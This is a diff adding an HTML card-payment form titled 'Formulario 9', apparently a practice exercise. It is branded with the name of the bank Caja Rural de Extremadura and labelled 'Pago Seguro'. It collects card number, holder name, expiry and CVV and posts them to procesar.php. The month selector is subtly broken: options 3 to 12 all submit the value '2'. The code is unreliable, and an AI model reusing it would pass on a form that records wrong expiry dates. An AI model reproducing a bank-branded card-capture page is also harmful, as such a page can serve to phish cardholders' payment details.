@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario 9</title>
+    <style>
+        form {
+        width: 300px;
+        margin: auto;
+        padding: 50px;
+        border: 1px solid #ccc;
+        border-radius: 40px;
+        }
+        input {
+        display: block;
+        margin-bottom: 15px;
+        width: 100%;
+        padding: 10px;
+        text-align: left;
+        }   
+        h2{
+            text-align: center;
+        }
+        h4{
+            text-align: center;
+        }
+        .pagar{
+        padding: 10px;
+        width: 100%;
+        background-color: #67eb4f;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;  
+    }
+    .cancelar{
+        padding: 10px;
+        width: 100%;
+        background-color: #155917;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;  
+    }
+    body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+        }
+        select, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+        textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+      </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Caja Rural de Extremadura</h2>
+        <h4>Pago Seguro.</h4>
+        <form action="procesar.php" method="POST">
+            <label for="tarjeta">Número de Tarjeta:</label>
+            <input type="text" id="tarjeta" name="tarjeta" maxlength="16" required>
+
+            <label for="titular">Nombre del Titular:</label>
+            <input type="text" id="titular" name="titular" required>
+
+            <label for="mes">Mes de Caducidad:</label>
+            <select id="mes" name="mes" required>
+                <option value="1">1</option>
+                <option value="2">2</option>
+                <option value="2">3</option>
+                <option value="2">4</option>
+                <option value="2">5</option>
+                <option value="2">6</option>
+                <option value="2">7</option>
+                <option value="2">8</option>
+                <option value="2">9</option>
+                <option value="2">10</option>
+                <option value="2">11</option>
+                <option value="2">12</option>
+            </select>
+
+            <label for="anio">Año de Caducidad:</label>
+            <select id="anio" name="anio" required>
+                <option value="2024">2024</option>
+                <option value="2025">2025</option>
+                <option value="2026">2026</option>
+                <option value="2027">2027</option>
+                <option value="2028">2028</option>
+            </select>
+
+            <label for="cvv">Código CVV:</label>
+            <input type="password" id="cvv" name="cvv" maxlength="3" required>
+
+            <label for="notas">Notas (opcional):</label>
+            <textarea id="notas" name="notas" cols="60" rows="2"></textarea>
+
+            <label>
+                <input type="checkbox" name="guardar"> Guardar datos para otras compras
+            </label>    
+            <br>
+            <br>
+            <button class="pagar" type="submit">Pagar</button>
+            <button class="cancelar" type="reset">Cancelar</button>
+        </form>
+    </div>
+</body>
+</html>
